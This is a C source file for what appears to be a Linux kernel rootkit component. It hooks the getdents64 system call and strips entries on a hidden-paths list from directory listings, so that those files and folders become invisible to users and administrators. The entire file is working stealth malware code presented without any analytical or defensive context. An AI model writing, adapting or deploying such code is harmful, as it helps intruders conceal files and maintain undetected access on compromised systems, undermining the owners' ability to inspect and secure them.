#include "hide.h"

LIST_HEAD(hidden_dirs_list);
spinlock_t hidden_dirs_lock = __SPIN_LOCK_UNLOCKED(hidden_dirs_lock);

asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;

asmlinkage int getdents64_hook(const struct pt_regs *regs) {
    int ret;
    int fd = (int)regs->di;
    struct file *dir_f;
    struct path parent_path;
    char dirbuf[512];
    char *dirstr = NULL;

    dir_f = fget(fd);
    if (dir_f) {
        parent_path = dir_f->f_path;
        path_get(&parent_path);
        dirstr = d_path(&parent_path, dirbuf, sizeof(dirbuf));
        path_put(&parent_path);
        fput(dir_f);
    }

    // Get the pointer to the directory entrues buffer
    struct linux_dirent64 __user *user_dir =
        (struct linux_dirent64 __user *)regs->si;

    // Get the size of the buffer
    // unsigned int count = (unsigned int)regs->dx;

    // Call the original getdents64 syscall, to have the buffer updated
    // Next, we just need to check directories in the buffer,
    // remove the ones we don't want, and copy the buffer to user space
    ret = __orig_getdents64(regs);
    if (ret < 0)
        return ret;

    // Allocate a temporary buffer in kernel space for copying and processing
    // the entries. Next copy the buffer from user space to kernel space.
    char *kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, user_dir, ret)) {
        kfree(kbuf);
        return ret;
    }

    // Current position in the kbuf buffer for processing entries
    unsigned int offset = 0;

    // Allocate a second temporary buffer to store the non-hidden directory
    // entries
    char *newbuf = kmalloc(ret, GFP_KERNEL);
    if (!newbuf) {
        kfree(kbuf);
        return ret;
    }

    unsigned int new_size = ret;
    unsigned int new_off = 0;

    // Loop through the entries in the buffer
    // Check if the entry is hidden or not
    while (offset < ret) {
        struct linux_dirent64 *d = (void *)(kbuf + offset);
        int reclen = d->d_reclen;

        // Build full path to be more precise than before
        bool hide = false;
        if (dirstr) {
            char fullpath[512];
            int len;

            if (strcmp(dirstr, "/") == 0) {
                len = snprintf(fullpath, sizeof(fullpath), "/%s", d->d_name);
            }
            else {
                len = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirstr, d->d_name);
            }

            if (len > 0 && len < sizeof(fullpath) && is_hidden(fullpath))
                hide = true;
        }

        if (hide)
            new_size -= reclen;
        else {
            memcpy(newbuf + new_off, d, reclen);
            new_off += reclen;
        }
        offset += reclen;
    }

    // Copy the modified new buffer back to the user-space buffer to replace the original buf
    if (copy_to_user(user_dir, newbuf, new_size)) {
        kfree(kbuf);
        kfree(newbuf);
        return ret;
    }

    kfree(kbuf);
    kfree(newbuf);

    // New size without directories we do not want...
    return new_size;
}